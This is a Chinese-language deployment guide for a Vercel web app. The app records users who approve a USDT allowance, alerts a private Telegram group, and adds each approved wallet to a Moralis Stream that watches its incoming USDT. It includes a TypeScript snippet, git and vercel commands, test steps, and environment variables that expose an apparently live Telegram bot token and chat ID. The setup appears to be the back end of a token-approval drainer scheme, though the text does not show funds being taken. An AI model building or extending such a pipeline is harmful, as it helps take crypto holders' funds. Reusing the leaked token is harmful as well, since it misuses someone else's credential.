# 部署自动监听功能

## 当前状态

代码已修改完成，包含以下功能:

### 授权流程
```
用户授权 USDT
  -> 更新用户状态 (approved = 1)
  -> 发送 Telegram 通知
  -> 添加到 wallet_monitor 表
  -> 自动添加到 Moralis Stream (新增)
```

### 关键代码位置
文件: src/app/api/user/authorize/route.ts
行号: 472-480

```typescript
// 添加地址到 Moralis Stream 链上监听
try {
  console.log('添加地址到 Moralis Stream 链上监听...', wallet_address)
  await addAddressToMoralisStream(wallet_address)
  console.log('地址已添加到 Moralis Stream 监听')
} catch (moralisError) {
  console.error('添加地址到 Moralis Stream 失败（非致命错误）:', moralisError)
}
```

---

## 部署步骤

### 步骤 1: 提交代码

```bash
git add src/app/api/user/authorize/route.ts
git add src/app/api/telegram/callback/route.ts
git commit -m "feat: 自动添加授权地址到 Moralis Stream 监听"
```

### 步骤 2: 部署到 Vercel

```bash
vercel --prod
```

或通过 Git 自动部署:
```bash
git push origin master
```

### 步骤 3: 验证部署

访问 Vercel Dashboard 确认部署成功

检查日志是否有新的部署记录

---

## 测试验证

### 步骤 1: 完成一次授权

1. 访问 https://ethmax.vercel.app
2. 连接钱包
3. 授权 USDT

### 步骤 2: 检查日志

Vercel Dashboard -> Logs

搜索关键词: "添加地址到 Moralis Stream"

应该看到:
```
添加地址到 Moralis Stream 链上监听... 0x...
Moralis SDK 初始化成功
地址已添加到现有 Moralis Stream
```

或首次时:
```
添加地址到 Moralis Stream 链上监听... 0x...
Moralis SDK 初始化成功
Stream 不存在，创建新的 Moralis Stream...
创建 Moralis Stream 并添加地址成功
```

### 步骤 3: 验证 Moralis Dashboard

1. 访问 https://admin.moralis.io/streams
2. 找到 Stream: eth-usdt-monitor
3. 检查地址列表
4. 确认授权地址在列表中

### 步骤 4: 测试交易通知

1. 向授权地址发送 1 USDT
2. 等待交易确认
3. 检查 Telegram 群组
4. 应收到交易通知

---

## 环境变量要求

确保 Vercel 环境变量中包含:

```
MORALIS_API_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
TELEGRAM_BOT_TOKEN=8244139410:AAECUajPMdPx4C6b64YO0Wu2ginswejST_I
TELEGRAM_CHAT_ID=-1003149735777
NEXT_PUBLIC_APP_URL=https://ethmax.vercel.app
SUPABASE_SERVICE_ROLE_KEY=你的Supabase服务密钥
```

---

## 常见问题

### Q: 部署后还是不自动添加?
检查 Vercel 环境变量 MORALIS_API_KEY 是否设置

### Q: 如何知道是否添加成功?
查看 Vercel 日志，搜索 "Moralis Stream"

### Q: Moralis Stream 不存在怎么办?
系统会在首次授权时自动创建

### Q: 能否批量添加现有用户?
可以，创建脚本遍历所有已授权用户并调用 addAddressToMoralisStream

---

## 立即部署

```bash
# 1. 提交代码
git add .
git commit -m "feat: 自动添加授权地址到链上监听"

# 2. 部署
vercel --prod

# 3. 等待部署完成（约1-2分钟）

# 4. 测试授权流程
```

部署完成后，所有新授权的用户都会自动添加到 Moralis Stream 监听列表。


